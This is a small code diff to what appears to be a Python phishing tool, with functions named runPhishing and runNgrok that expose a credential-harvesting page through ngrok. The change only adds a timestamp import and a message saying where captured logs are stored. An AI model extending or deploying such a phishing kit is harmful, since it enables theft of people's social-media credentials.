@@ -17,6 +17,7 @@ from subprocess import getoutput
 from core.email import send_mail
 from core.credentials import credentials
 from smtplib import SMTPSenderRefused, SMTPServerDisconnected
+from time import strftime
 
 def runPhishing(social, custom):
     global _social
@@ -58,6 +59,7 @@ def runNgrok():
     while ngrok_url == '':
         ngrok_url = getoutput(check)
     print(green('\n [*] Ngrok URL: %s' % ngrok_url))
+    print(green(' [*] Your logs are being stored in: Logs/{}').format(_social + strftime('-%y%m%d.txt')))
     print(yellow(' [^] Press Ctrl+C or VolDown+C(android) to quit'))
 
 def runServer():
